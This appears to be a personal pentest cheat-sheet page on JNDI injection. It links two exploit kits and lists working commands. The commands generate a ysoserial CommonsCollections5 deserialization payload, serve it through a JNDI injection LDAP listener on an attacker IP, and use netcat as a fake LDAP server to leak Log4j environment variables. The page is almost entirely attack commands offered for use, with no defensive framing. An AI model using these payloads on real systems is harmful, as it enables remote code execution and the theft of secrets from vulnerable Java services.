# jndi

{% embed url="https://github.com/exp1orer/JNDI-Inject-Exploit" %}

{% embed url="https://github.com/pimps/JNDI-Exploit-Kit" %}

```
java -jar ysoserial.jar CommonsCollections5 'ping -c 1 10.10.14.32' > ping.ser
ysoserial don't work well with commands with ; or | or &
github.com/pimps/ysoserial-modified fix the problem 

sudo java -jar JNDI-Injection-Exploit.jar -P ping.ser -L 10.10.14.32:389

use nc to comunicate with ldap for log4j env leakage
echo -e '0\x0c\x02\x01\x01a\x07\x0a\x01\x00\x04\x00\x04\00' | nc -nvv -l -p 389 | xxd
```
